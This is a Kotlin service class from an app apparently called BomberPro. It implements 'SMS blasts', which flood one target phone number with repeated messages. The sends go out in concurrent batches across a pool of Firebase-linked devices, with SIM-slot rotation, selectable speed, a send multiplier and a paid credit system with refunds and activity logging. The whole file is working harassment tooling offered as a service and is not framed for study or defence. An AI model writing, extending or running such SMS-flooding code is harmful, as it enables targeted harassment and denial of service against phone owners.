package com.sanji.bomberpro.services

import kotlinx.coroutines.NonCancellable
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.callbackFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withLock
import kotlinx.coroutines.sync.withPermit
import kotlinx.coroutines.withContext
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import kotlin.math.min

sealed class BlastEvent {
    data class Started(
        val total: Int,
        val devices: Int,
        val reservedCredits: Int,
        val powerMode: Int,
    ) : BlastEvent()

    data class Progress(
        val sent: Int,
        val failed: Int,
        val total: Int,
        val ratePerSec: Double,
    ) : BlastEvent()

    data class Complete(
        val sent: Int,
        val failed: Int,
        val durationSec: Long,
        val cancelled: Boolean,
        val refundedCredits: Int,
        val finalBalance: Int,
    ) : BlastEvent()

    data class Error(val message: String) : BlastEvent()
}

enum class BlastSpeed(val delayMs: Long, val label: String) {
    FAST(1, "FAST"),
    MEDIUM(50, "MEDIUM"),
    SLOW(200, "SLOW"),
}

class BlastExecutor(private val rtdb: RealtimeDbService) {

    /**
     * @param count   base number of sends requested by user
     * @param power   power multiplier (2, 3, 4, 5, 10)
     * @param threads max concurrent sends (default 20)
     */
    fun execute(
        uid: String,
        isAdmin: Boolean,
        userData: UserDataService,
        userName: String,
        userEmail: String,
        devices: List<Device>,
        target: String,
        message: String,
        count: Int,
        power: Int,
        threads: Int,
        speed: BlastSpeed,
        cancelFlag: AtomicBoolean,
    ): Flow<BlastEvent> = callbackFlow {
        if (devices.isEmpty()) {
            trySend(BlastEvent.Error("No devices online"))
            close()
            return@callbackFlow
        }
        if (count <= 0) {
            trySend(BlastEvent.Error("Count must be > 0"))
            close()
            return@callbackFlow
        }

        // -----------------------------------------------------------
        //  total = count × power  (matches bot behavior)
        // -----------------------------------------------------------
        val desiredTotal = count * power
        val deviceCapacity = devices.size * power
        val effectiveTotal = min(desiredTotal, deviceCapacity)

        // -----------------------------------------------------------
        //  reserve credits upfront = min(effectiveTotal, user credits)
        // -----------------------------------------------------------
        val reserved: Int = if (isAdmin) effectiveTotal
        else minOf(effectiveTotal, userData.getCredits(uid))

        if (!isAdmin) {
            if (reserved <= 0) {
                trySend(BlastEvent.Error("No credits available"))
                close()
                return@callbackFlow
            }
            if (!userData.deductCredits(uid, reserved, "blast-reserve")) {
                trySend(BlastEvent.Error("Insufficient credits"))
                close()
                return@callbackFlow
            }
        }

        val total = reserved
        val sent = AtomicInteger(0)
        val failed = AtomicInteger(0)
        val startedAt = System.currentTimeMillis()
        val deviceLabels = devices.map { it.firebaseLabel }.distinct()

        trySend(BlastEvent.Started(total, devices.size, reserved, power))

        // -----------------------------------------------------------
        //  per-device cooldown protected by mutex
        // -----------------------------------------------------------
        val deviceCooldownMutex = Mutex()
        val deviceLastSend = mutableMapOf<String, Long>()
        val perDeviceMinGapMs = 250L

        val semaphore = Semaphore(min(threads.coerceAtLeast(1), devices.size))

        val progressJob = launch {
            while (isActive) {
                delay(500)
                val s = sent.get()
                val f = failed.get()
                val elapsed = (System.currentTimeMillis() - startedAt) / 1000.0
                val rate = if (elapsed > 0) (s + f) / elapsed else 0.0
                trySend(BlastEvent.Progress(s, f, total, rate))
                if (s + f >= total) break
            }
        }

        var wasCancelled = false

        try {
            coroutineScope {
                // build job list of `total` sends
                // pass_num = index / devices.size  → determines which SIM to use
                //              and gives natural rotation
                val jobs = (0 until total).map { i ->
                    async {
                        if (cancelFlag.get()) return@async

                        semaphore.withPermit {
                            if (cancelFlag.get()) return@withPermit
                            if (sent.get() + failed.get() >= total) return@withPermit

                            val device = devices[i % devices.size]
                            val passNum = i / devices.size

                            // cooldown read+write inside lock
                            val waitMs = deviceCooldownMutex.withLock {
                                val now = System.currentTimeMillis()
                                val last = deviceLastSend[device.deviceId] ?: 0L
                                val wait = perDeviceMinGapMs - (now - last)
                                if (wait > 0) {
                                    deviceLastSend[device.deviceId] = now + wait
                                    wait
                                } else {
                                    deviceLastSend[device.deviceId] = now
                                    0L
                                }
                            }
                            if (waitMs > 0) delay(waitMs)

                            // SIM rotation (bot parity)
                            val sim = simSlotFor(device, passNum)

                            val result = rtdb.sendSms(
                                firebaseUrl = device.firebaseUrl,
                                deviceId = device.deviceId,
                                simSlot = sim,
                                to = target,
                                message = message,
                            )

                            if (result.ok) sent.incrementAndGet() else failed.incrementAndGet()

                            if (speed.delayMs > 0) delay(speed.delayMs)
                        }
                    }
                }
                jobs.awaitAll()
            }

            wasCancelled = cancelFlag.get()
            progressJob.cancel()
        } catch (e: Exception) {
            wasCancelled = cancelFlag.get()
            progressJob.cancel()
            trySend(BlastEvent.Error(e.message ?: "Blast failed"))
        } finally {
            withContext(NonCancellable) {
                val actualSent = sent.get()
                val actualFailed = failed.get()
                val duration = (System.currentTimeMillis() - startedAt) / 1000L

                // ------------------------------------------------
                //  REFUND
                //  reserved credits were deducted upfront.
                //  Anything not sent (failed OR cancelled) is refunded.
                // ------------------------------------------------
                val refundAmount: Int = if (isAdmin) 0 else (reserved - actualSent).coerceAtLeast(0)
                if (refundAmount > 0) {
                    try {
                        userData.addCredits(uid, refundAmount, "blast-refund")
                    } catch (_: Exception) {}
                }

                val finalBalance = if (isAdmin) 0 else userData.getCredits(uid)

                // ------------------------------------------------
                //  SAVE HISTORY
                // ------------------------------------------------
                try {
                    userData.saveBlastHistory(
                        uid = uid,
                        targetFull = target,
                        message = message,
                        requested = total,
                        sent = actualSent,
                        failed = actualFailed,
                        durationSec = duration,
                        speed = "${speed.label} ${power}x",
                        devicePool = deviceLabels,
                        status = if (wasCancelled) "stopped" else "completed",
                    )
                } catch (_: Exception) {}

                // ------------------------------------------------
                //  ACTIVITY LOG
                // ------------------------------------------------
                try {
                    userData.logActivity(
                        uid = uid,
                        userName = userName,
                        userEmail = userEmail,
                        action = "sms_blast",
                        targetMasked = userData.maskNumber(target),
                        targetFull = target,
                        details = mapOf(
                            "message" to message.take(200),
                            "requested" to total,
                            "sent" to actualSent,
                            "failed" to actualFailed,
                            "speed" to speed.label,
                            "power" to power,
                            "duration" to duration,
                            "devicePool" to deviceLabels,
                            "reserved" to reserved,
                            "refunded" to refundAmount,
                            "cancelled" to wasCancelled,
                        ),
                    )
                } catch (_: Exception) {}

                trySend(
                    BlastEvent.Complete(
                        sent = actualSent,
                        failed = actualFailed,
                        durationSec = duration,
                        cancelled = wasCancelled,
                        refundedCredits = refundAmount,
                        finalBalance = finalBalance,
                    )
                )
            }
        }

        close()
        awaitClose { cancelFlag.set(true) }
    }

    /**
     * Choose SIM slot for this pass.
     * Bot rotates sims[passNum % len(sims)].
     */
    private fun simSlotFor(device: Device, passNum: Int): Int {
        if (device.sims.isEmpty()) return 0
        val idx = passNum % device.sims.size
        val first = device.sims[idx]
        return (first["simSlotIndex"] as? Int) ?: 0
    }
}